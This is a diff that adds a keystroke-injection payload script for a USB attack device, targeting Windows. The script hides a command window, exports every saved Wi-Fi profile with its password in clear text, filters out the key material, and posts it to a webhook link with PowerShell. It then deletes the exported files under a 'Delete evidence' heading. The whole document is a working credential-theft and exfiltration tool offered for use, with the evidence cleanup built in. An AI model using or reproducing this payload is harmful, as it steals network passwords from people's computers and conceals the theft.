@@ -1,0 +1,59 @@
+#Title: WIN_wicry.txt
+#Discription: Short script saving wifi information in clear text and sending it to webhook
+#	      DELAY timers still need to be tested on slow and fast machines.
+#Author: 0iphor13 (Original version by MTK911 for DigiSpark)
+#Target: Windows (Tested on 7 and 10)
+
+
+MATCH wicry	
+
+export DUCKY_LANG=de
+
+QUACK LOCK
+
+Q GUI d
+DELAY 1000
+
+Q GUI r
+DELAY 5000
+
+#################Open CMD in smallest window##########################
+
+Q STRING "cmd /k mode con: cols=15 lines=1"
+DELAY 100000
+Q ENTER
+
+###################Change Directory###################################
+
+Q STRING "cd %temp%"
+DELAY 100000
+Q ENTER
+
+###################Export wlan profile in clear text##################
+
+Q STRING "netsh wlan export profile key=clear"
+DELAY 150000
+Q ENTER
+
+######################Send Data over to webhook link#######################
+
+Q STRING "powershell Select-String -Path WLAN*.xml -Pattern 'keyMaterial' > WLAN-PWD" 
+DELAY 100000
+Q ENTER
+
+Q STRING "powershell Invoke-WebRequest -Uri "[Webhook LINK]" -Method POST -InFile WLAN-PWD" 
+DELAY 100000
+Q ENTER
+
+#########################Delete evidence#################################
+
+Q STRING "del WLAN-* /s /f /q"  
+DELAY 100000
+Q ENTER
+
+Q STRING "exit"
+DELAY 100000
+Q ENTER
+
+QUACK UNLOCK
+
